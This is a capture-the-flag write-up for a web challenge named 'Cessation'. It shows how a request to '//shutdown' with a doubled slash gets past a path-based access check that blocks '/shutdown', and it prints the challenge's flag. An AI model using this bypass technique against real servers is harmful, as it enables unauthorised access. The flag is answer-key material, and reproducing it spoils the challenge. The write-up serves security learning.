# Cessation

## Challenge

```
curl http://178.62.14.240:32090/
```

```html
<div class="greeting-card">
    <h2>Its time to end!!<br/>Device Status: Online</h2>
</div>
```

```
curl http://178.62.14.240:32090/shutdown
```

```html
<div class="greeting-card">
    <h2>Access Denied..</h2>
</div>
```

## Solution

```
curl http://178.62.14.240:32090//shutdown
```

```html
<div class="greeting-card">
    <h2>Initiating Network Shutdown...<br/>Device Status: Offline<br/>CHTB{c3ss4t10n_n33d_sync1ng_#@$?}</h2>
</div>
```

## Flag

`CHTB{c3ss4t10n_n33d_sync1ng_#@$?}`

